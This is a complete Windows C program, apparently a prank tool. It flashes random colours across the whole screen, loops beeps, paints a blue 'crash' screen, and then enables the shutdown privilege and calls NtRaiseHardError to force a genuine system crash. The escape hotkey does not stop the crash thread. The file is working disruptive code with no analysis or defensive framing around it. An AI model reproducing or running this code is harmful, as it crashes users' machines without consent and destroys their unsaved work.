#include <windows.h>

typedef NTSTATUS(NTAPI *pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
typedef NTSTATUS(NTAPI *pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);

#define myrand (rand() & 255)

//Different bsod color 
#define COLOR_CLASSIC RGB(0,0,170)
#define COLOR_XP RGB(0,0,130)
#define COLOR_8 RGB(17,115,170)
#define COLOR_10 RGB(0,120,215)
#define COLOR_BLACK RGB(0,0,0)

int rangeRand(int low, int high) {
    return low + (((unsigned int) rand()) % (high-low+1)); 
}

const int flickerrate = 100;     //in ms
int flickertime;    //in ms
HANDLE colorthread, colorthreadblue, beepthread;

HDC screen;
HBRUSH myBrush;


DWORD WINAPI colorlooper(void *dummy) {
    UNREFERENCED_PARAMETER(dummy);
    screen = GetDC(NULL);
    int screenX = 100;
    int screenY = 95;
    screenX = GetSystemMetrics(SM_CXSCREEN);
    screenY = GetSystemMetrics(SM_CYSCREEN);

    for(int i=0; i < flickertime; i+=flickerrate) {
        myBrush = CreateSolidBrush(RGB(myrand, myrand, myrand));
        SelectObject(screen, myBrush);
        Rectangle(screen, 0, 0, screenX, screenY);
        Sleep(flickerrate);
        if(myBrush != NULL) {
            DeleteObject(myBrush);
            myBrush = NULL;
        }
    };

    return 0;
}

DWORD WINAPI colorlooper2(void *dummy) {
    UNREFERENCED_PARAMETER(dummy);
    screen = GetDC(NULL);
    int screenX = 100;
    int screenY = 95;
    screenX = GetSystemMetrics(SM_CXSCREEN);
    screenY = GetSystemMetrics(SM_CYSCREEN);
    
    HBRUSH innerBrush = CreateSolidBrush(COLOR_10);     //change to certain color marcos defined above

    WaitForSingleObject(colorthread, flickertime);

    while(1) {
        SelectObject(screen, innerBrush);
        Rectangle(screen, 0, 0, screenX, screenY);
        Sleep(95);
    };

    return 0;
}

DWORD WINAPI beeplooper(void* dummy) {
    UNREFERENCED_PARAMETER(dummy);
    while(1) {
        Beep(440, 200);
        Beep(700, 200);
        Beep(650, 100);
        Beep(855, 200);
        Beep(810, 100);
        Beep(565, 100);
        Beep(666, 50);
    }

    return 0;
}

DWORD WINAPI harderrorrun(void *dummy) {
    UNREFERENCED_PARAMETER(dummy);
    BOOLEAN bEnabled;
    ULONG uResp;

    WaitForSingleObject(colorthread, flickertime);

    LPVOID lpFuncAddress = (LPVOID) GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
    LPVOID lpFuncAddress2 = (LPVOID) GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtRaiseHardError");
    pdef_RtlAdjustPrivilege CallRtlAdjustPrivilege = (pdef_RtlAdjustPrivilege)lpFuncAddress;
    pdef_NtRaiseHardError CallNtRaiseHardError = (pdef_NtRaiseHardError)lpFuncAddress2;
    CallRtlAdjustPrivilege(19, TRUE, FALSE, &bEnabled); 
    CallNtRaiseHardError(0xdeadbeef, 0, 0, 0, 6, &uResp); 

    return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine, int nCmdShow) {
    int ret = 0;
    UNREFERENCED_PARAMETER(hInstance)
    UNREFERENCED_PARAMETER(hPrevInstance)
    UNREFERENCED_PARAMETER(lpCmdLine)
    UNREFERENCED_PARAMETER(nCmdShow)
    UNREFERENCED_PARAMETER(ret);

    ret = RegisterHotKey(NULL, 1, MOD_ALT | MOD_CONTROL | MOD_NOREPEAT, 'E');

    flickertime = rangeRand(4000,6500);

    colorthread = CreateThread(NULL, 0, colorlooper, NULL, 0, NULL);
    colorthreadblue = CreateThread(NULL, 0, colorlooper2, NULL, 0, NULL);
    beepthread = CreateThread(NULL, 0, beeplooper, NULL, 0, NULL);
    CreateThread(NULL, 0, harderrorrun, NULL, 0, NULL);

    MSG monosodium_glutamate;
    while(GetMessageA(&monosodium_glutamate, NULL, 0, 0) != 0) {
        if(monosodium_glutamate.message == WM_HOTKEY) {
            PostQuitMessage(0);
        }
    }
    return 0;
}